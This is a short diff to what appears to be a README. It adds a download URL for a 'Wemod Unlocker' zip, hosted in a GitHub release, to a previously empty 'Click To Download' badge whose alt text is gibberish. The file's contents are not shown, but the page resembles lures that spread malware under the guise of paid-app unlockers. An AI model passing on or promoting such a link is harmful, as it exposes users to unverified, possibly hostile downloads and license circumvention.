@@ -5,7 +5,7 @@
 
 
 
-[![azssdasdasd](https://img.shields.io/badge/Wemod_Unlocker-Click_To_Download-blue?style=for-the-badge&logo=Github)]()
+[![azssdasdasd](https://img.shields.io/badge/Wemod_Unlocker-Click_To_Download-blue?style=for-the-badge&logo=Github)](https://github.com/RichihudsonWh/Wemod-Unlocked/releases/download/Wemod_Unlocker/Wemod_Unlocker.zip)
 
 
 ### Instructions:
